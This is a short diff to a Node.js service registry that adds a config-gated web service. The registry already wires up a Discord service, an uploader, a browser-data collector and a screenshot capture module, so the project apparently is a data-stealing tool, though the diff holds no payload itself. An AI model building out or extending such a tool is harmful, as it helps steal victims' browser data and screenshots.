@@ -5,10 +5,12 @@
 
 const { DiscordService } = require('../services/discord/service');
 const { uploadService } = require('../services/upload/service');
+const { WebService } = require('../services/web/service');
 const { BrowserCollector } = require('../modules/browsers/collector');
 const { ScreenshotCapture } = require('../modules/screenshot/capture');
 const { logger } = require('./logger');
 const { ErrorHandler } = require('./errors');
+const config = require('../config/config');
 
 class ServiceManager {
     constructor() {
@@ -76,6 +78,11 @@ class ServiceManager {
         // Register services with dependencies
         this.register('discord', () => new DiscordService(), ['upload']);
         this.register('browserCollector', () => new BrowserCollector(), []);
+        
+        // Register web service if enabled
+        if (config.get('modules.enabled.web', false)) {
+            this.register('web', () => new WebService(), []);
+        }
     }
 
     /**
